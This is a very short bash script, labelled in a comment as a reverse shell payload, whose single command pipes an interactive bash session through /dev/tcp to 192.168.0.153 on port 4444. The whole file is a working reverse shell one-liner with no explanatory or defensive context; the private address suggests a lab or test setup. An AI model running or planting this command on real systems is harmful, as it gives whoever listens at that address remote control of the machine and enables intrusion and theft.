#!/bin/bash

# Reverse shell payload
bash -i >& /dev/tcp/192.168.0.153/4444 0>&1
